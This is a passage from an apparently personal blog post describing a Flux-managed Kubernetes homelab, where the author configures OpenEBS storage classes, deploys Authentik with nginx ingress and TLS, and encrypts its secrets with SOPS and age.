font-style: inherit;">"true"</span></span>
<span id="cb50-14"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">creationTimestamp</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"2024-10-22T02:33:23Z"</span></span>
<span id="cb50-15"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">labels</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb50-16"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">app.kubernetes.io/managed-by</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> Helm</span></span>
<span id="cb50-17"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">helm.toolkit.fluxcd.io/name</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> openebs</span></span>
<span id="cb50-18"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">helm.toolkit.fluxcd.io/namespace</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> default</span></span>
<span id="cb50-19"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">name</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> openebs-hostpath</span></span>
<span id="cb50-20"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">resourceVersion</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"10886300"</span></span>
<span id="cb50-21"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">uid</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> 0bfb540c-e5e6-4f4c-bf7b-cd232630742c</span></span>
<span id="cb50-22"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">provisioner</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> openebs.io/local</span></span>
<span id="cb50-23"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">reclaimPolicy</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> Delete</span></span>
<span id="cb50-24"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">volumeBindingMode</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> WaitForFirstConsumer</span></span></code></pre></div>
<p>I appended: <code>storageclass.kubernetes.io/is-default-class: "true"</code> to the annotations section, and then PersistentVolumes are automatically created to satisfy the needs of authentik:</p>
<div class="sourceCode" id="cb51" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb51-1">[moonpie@lizard flux-config]$ kubectl get persistentvolumes</span>
<span id="cb51-2">NAME                                       CAPACITY   ACCESS MODES   RECLAIM POLICY   STATUS   CLAIM                                         STORAGECLASS       VOLUMEATTRIBUTESCLASS   REASON   AGE</span>
<span id="cb51-3">pvc-e179a2b6-0fa2-4fd8-9cfd-07c152b10bbe   8Gi        RWO            Delete           Bound    default/redis-data-authentik-redis-master-0   openebs-hostpath   &lt;unset&gt;                          9m35s</span>
<span id="cb51-4">pvc-ed21ace0-2580-4ea1-aaeb-6b24b04bb55e   8Gi        RWO            Delete           Bound    default/data-authentik-postgresql-0           openebs-hostpath   &lt;unset&gt;                          9m35s</span></code></pre></div>
<p>After this, the Authentik server is up. But, it looks like a reclaim policy of “delete”, means that if I delete the Authentik helm chart, my user data will be deleted as well.</p>
<p>Instead, I think I need to manually create volumes in my flux config, that use “claimRef” to get claimed by the right PersistentVolumeClaims. Or maybe I can have openebs volumes retain themselves?</p>
<p>Actually, I think I need to <a href="https://openebs.io/docs/user-guides/local-storage-user-guide/local-pv-hostpath/hostpath-configuration">create another storageclass</a> that can dynamically provision volumes, but this one has the settings and specs I want, and is the default.</p>
<p>So, I did that:</p>
<div class="code-with-filename">
<div class="code-with-filename-file">
<pre><strong>openebs/localpath.yaml</strong></pre>
</div>
<div class="sourceCode" id="cb52" data-filename="openebs/localpath.yaml" style="background: #f1f3f5;"><pre class="sourceCode yaml code-with-copy"><code class="sourceCode yaml"><span id="cb52-1"><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">---</span></span>
<span id="cb52-2"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">apiVersion</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> storage.k8s.io/v1</span></span>
<span id="cb52-3"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">kind</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> StorageClass</span></span>
<span id="cb52-4"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">metadata</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb52-5"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">name</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> openebs-persistent-hostpath</span></span>
<span id="cb52-6"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">namespace</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> default</span></span>
<span id="cb52-7"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">annotations</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb52-8"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">openebs.io/cas-type</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> local</span></span>
<span id="cb52-9"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">    cas.openebs.io/config</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">: </span><span class="ch" style="color: #20794D;
background-color: null;
font-style: inherit;">|</span></span>
<span id="cb52-10">      - name: StorageType</span>
<span id="cb52-11">        value: hostpath</span>
<span id="cb52-12">      - name: BasePath</span>
<span id="cb52-13">        value: /var/openebs/persistent/</span>
<span id="cb52-14"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">storageclass.kubernetes.io/is-default-class</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"true"</span></span>
<span id="cb52-15"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">provisioner</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> openebs.io/local</span></span>
<span id="cb52-16"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">reclaimPolicy</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> Retain</span></span>
<span id="cb52-17"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">volumeBindingMode</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> WaitForFirstConsumer</span></span></code></pre></div>
</div>
<p>And with this, I should get persistent data. Now, I should get the ingress working.</p>
</section>
<section id="ingress" class="level3">
<h3 class="anchored" data-anchor-id="ingress">Ingress</h3>
<div class="sourceCode" id="cb53" style="background: #f1f3f5;"><pre class="sourceCode yaml code-with-copy"><code class="sourceCode yaml"><span id="cb53-1"><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">---</span></span>
<span id="cb53-2"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">apiVersion</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> helm.toolkit.fluxcd.io/v2</span></span>
<span id="cb53-3"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">kind</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> HelmRelease</span></span>
<span id="cb53-4"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">metadata</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb53-5"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">name</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> authentik</span></span>
<span id="cb53-6"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">namespace</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> default</span></span>
<span id="cb53-7"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">spec</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb53-8"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">chart</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb53-9"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">spec</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb53-10"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">      </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">chart</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> authentik</span></span>
<span id="cb53-11"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">      </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">reconcileStrategy</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> ChartVersion</span></span>
<span id="cb53-12"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">      </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">sourceRef</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb53-13"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">        </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">kind</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> HelmRepository</span></span>
<span id="cb53-14"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">        </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">name</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> authentik</span></span>
<span id="cb53-15"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">        # Figure out what version I should have</span></span>
<span id="cb53-16"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">      # version: </span></span>
<span id="cb53-17"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">interval</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> 1m0s</span></span>
<span id="cb53-18"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">values</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb53-19"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">authentik</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb53-20"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">        </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">secret_key</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"PleaseGenerateASecureKey"</span></span>
<span id="cb53-21"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">        # This sends anonymous usage-data, stack traces on errors and</span></span>
<span id="cb53-22"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">        # performance data to sentry.io, and is fully opt-in</span></span>
<span id="cb53-23"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">        </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">error_reporting</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb53-24"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">            </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">enabled</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="ch" style="color: #20794D;
background-color: null;
font-style: inherit;">true</span></span>
<span id="cb53-25"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">        </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">postgresql</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb53-26"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">            </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">password</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"ThisIsNotASecurePassword"</span></span>
<span id="cb53-27"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">server</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb53-28"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">        </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">ingress</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb53-29"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">            </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">ingressClassName</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> nginx</span></span>
<span id="cb53-30"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">            # Change to true when done</span></span>
<span id="cb53-31"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">            </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">enabled</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="ch" style="color: #20794D;
background-color: null;
font-style: inherit;">true</span></span>
<span id="cb53-32"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">            </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">hosts</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb53-33"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">                </span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> sso.moonpiedumpl.ing</span></span>
<span id="cb53-34"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">            </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">annotations</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb53-35"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">                </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">cert-manager.io/issuer</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"letsencrypt-staging"</span></span>
<span id="cb53-36"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">                </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">acme.cert-manager.io/http01-edit-in-place</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"true"</span></span>
<span id="cb53-37"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">            </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">tls</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb53-38"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">              </span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">hosts</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">[</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">sso.moonpiedumpl.ing</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">]</span></span>
<span id="cb53-39"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">                </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">secretName</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> sso-acme</span></span>
<span id="cb53-40"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">postgresql</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb53-41"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">        </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">enabled</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="ch" style="color: #20794D;
background-color: null;
font-style: inherit;">true</span></span>
<span id="cb53-42"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">        </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">auth</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb53-43"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">            </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">password</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"ThisIsNotASecurePassword"</span></span>
<span id="cb53-44"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">redis</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb53-45"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">        </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">enabled</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="ch" style="color: #20794D;
background-color: null;
font-style: inherit;">true</span></span></code></pre></div>
<p>And this works, including getting an SSL certificate from the letsencrypt-staging server.</p>
<p>Now I need to set up encryption of my secrets, because I want for this git repo to be public.</p>
</section>
<section id="secretssops" class="level3">
<h3 class="anchored" data-anchor-id="secretssops">Secrets/SOPS</h3>
<p>So, authentik looks difficult, because the helm chart requires quite a complex set of configurations, and I don’t want to put those in the same file for the helmrelease.</p>
<p>I think what I want to do is this: I should seperate out the authentik configs into a “ConfigMap”, which gets fed to the helm chart, and that will be one portion of the authentik config. The other portion will be a “Secret” which gets decrypted by fluxcd and sops.</p>
<ul>
<li><a href="https://fluxcd.io/flux/guides/mozilla-sops/">Fluxcd docs on sops</a> (I will be using age, since that’s what the sops docs recomment)</li>
<li><a href="https://fluxcd.io/flux/migration/helm-operator-migration/#configmap-and-secret-references">FLuxcd docs on configmap and secret references</a></li>
</ul>
<p>I started by following the <a href="https://fluxcd.io/flux/guides/mozilla-sops/">sops-age</a> guide.</p>
<p>So, here is the problem I am encountering. I want to encrypt only the relevant values, but a configmap or secret stores the entire secret means that I have to encrypt an entire set of data values.</p>
<p>I was hoping for something like this:</p>
<div class="code-with-filename">
<div class="code-with-filename-file">
<pre><strong>helmrelease.yaml</strong></pre>
</div>
<div class="sourceCode" id="cb54" data-filename="helmrelease.yaml" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb54-1">---</span>
<span id="cb54-2">apiVersion: helm.toolkit.fluxcd.io/v2</span>
<span id="cb54-3">kind: HelmRelease</span>
<span id="cb54-4">metadata:</span>
<span id="cb54-5">  name: authentik</span>
<span id="cb54-6">  namespace: default</span>
<span id="cb54-7">spec:</span>
<span id="cb54-8">  chart:</span>
<span id="cb54-9">    spec:</span>
<span id="cb54-10">      chart: authentik</span>
<span id="cb54-11">      reconcileStrategy: ChartVersion</span>
<span id="cb54-12">      sourceRef:</span>
<span id="cb54-13">        kind: HelmRepository</span>
<span id="cb54-14">        name: authentik</span>
<span id="cb54-15">        # Figure out what version I should have</span>
<span id="cb54-16">      # version: </span>
<span id="cb54-17">  interval: 1m0s</span>
<span id="cb54-18">  values:</span>
<span id="cb54-19">    authentik:</span>
<span id="cb54-20">        secret_key: "PleaseGenerateASecureKey"</span>
<span id="cb54-21">        # This sends anonymous usage-data, stack traces on errors and</span>
<span id="cb54-22">        # performance data to sentry.io, and is fully opt-in</span>
<span id="cb54-23">        error_reporting:</span>
<span id="cb54-24">            enabled: true</span>
<span id="cb54-25">        postgresql:</span>
<span id="cb54-26">            password: "ThisIsNotASecurePassword"</span>
<span id="cb54-27">    server:</span>
<span id="cb54-28">        ingress:</span>
<span id="cb54-29">            ingressClassName: nginx</span>
<span id="cb54-30">            # Change to true when done</span>
<span id="cb54-31">            enabled: false</span>
<span id="cb54-32">            hosts:</span>
<span id="cb54-33">                - authentik.moonpiedumpl.ing</span>
<span id="cb54-34">    postgresql:</span>
<span id="cb54-35">        enabled: true</span>
<span id="cb54-36">        auth:</span>
<span id="cb54-37">            password: "ThisIsNotASecurePassword"</span>
<span id="cb54-38">    redis:</span>
<span id="cb54-39">        enabled: true</span></code></pre></div>
</div>
<p>And then, I need to encrypt this file.</p>
<p>Before I do so, I generate secure passphrases using <a href="https://sr.ht/~cyplo/genpass/">genpass</a>, which is available in nixpkgs.</p>
<div class="sourceCode" id="cb55" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb55-1">sops --age=age1sg3u7ndj045gzv3u4w5t5kntplg6sz2hv6k3uxpxq85vtx56rc4s8q83gr \</span>
<span id="cb55-2">--encrypt --encrypted-regex '^(secret_key|password)$'</span></code></pre></div>
<p>I then pipe this out to a new file.</p>
<div class="sourceCode" id="cb56" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb56-1">apiVersion: helm.toolkit.fluxcd.io/v2</span>
<span id="cb56-2">kind: HelmRelease</span>
<span id="cb56-3">metadata:</span>
<span id="cb56-4">    name: authentik</span>
<span id="cb56-5">    namespace: default</span>
<span id="cb56-6">spec:</span>
<span id="cb56-7">    chart:</span>
<span id="cb56-8">        spec:</span>
<span id="cb56-9">            chart: authentik</span>
<span id="cb56-10">            reconcileStrategy: ChartVersion</span>
<span id="cb56-11">            sourceRef:</span>
<span id="cb56-12">                kind: HelmRepository</span>
<span id="cb56-13">                name: authentik</span>
<span id="cb56-14">                # Figure out what version I should have</span>
<span id="cb56-15">            # version: </span>
<span id="cb56-16">    interval: 1m0s</span>
<span id="cb56-17">    values:</span>
<span id="cb56-18">        authentik:</span>
<span id="cb56-19">            secret_key: ENC[AES256_GCM,data:igq7ugHC00ZPZ/0jFjAr/phAeCvhKn0J/avbNe01207L9Q==,iv:1NZuqFBFhc9vXQvTBw8nG20ZpZ6sUUxXrQRUw+KZ4yM=,tag:1QQUWHuiEavXfDi5lhQBFg==,type:str]</span>
<span id="cb56-20">            # This sends anonymous usage-data, stack traces on errors and</span>
<span id="cb56-21">            # performance data to sentry.io, and is fully opt-in</span>
<span id="cb56-22">            error_reporting:</span>
<span id="cb56-23">                enabled: true</span>
<span id="cb56-24">            postgresql:</span>
<span id="cb56-25">                password: ENC[AES256_GCM,data:9yNwAnLg62WePY0yiNBty+ii0CFOm+iSC6GI4ZzAgmGJ4Q==,iv:EsRZzPm8bZHycrhK2ZFPv2fp863pnwy2rGINXiyvCIk=,tag:PObidHEMUMFAmO0K50Nvqg==,type:str]</span>
<span id="cb56-26">        server:</span>
<span id="cb56-27">            ingress:</span>
<span id="cb56-28">                # Should default to nginx already</span>
<span id="cb56-29">                # ingressClassName: nginx</span>
<span id="cb56-30">                # Change to true when done</span>
<span id="cb56-31">                enabled: true</span>
<span id="cb56-32">                hosts:</span>
<span id="cb56-33">                    - sso.moonpiedumpl.ing</span>
<span id="cb56-34">                annotations:</span>
<span id="cb56-35">                    cert-manager.io/issuer: letsencrypt-staging</span>
<span id="cb56-36">                    acme.cert-manager.io/http01-edit-in-place: "true"</span>
<span id="cb56-37">                tls:</span>
<span id="cb56-38">                    - hosts:</span>
<span id="cb56-39">                        - sso.moonpiedumpl.ing</span>
<span id="cb56-40">                      secretName: sso-acme</span>
<span id="cb56-41">        postgresql:</span>
<span id="cb56-42">            enabled: true</span>
<span id="cb56-43">            auth:</span>
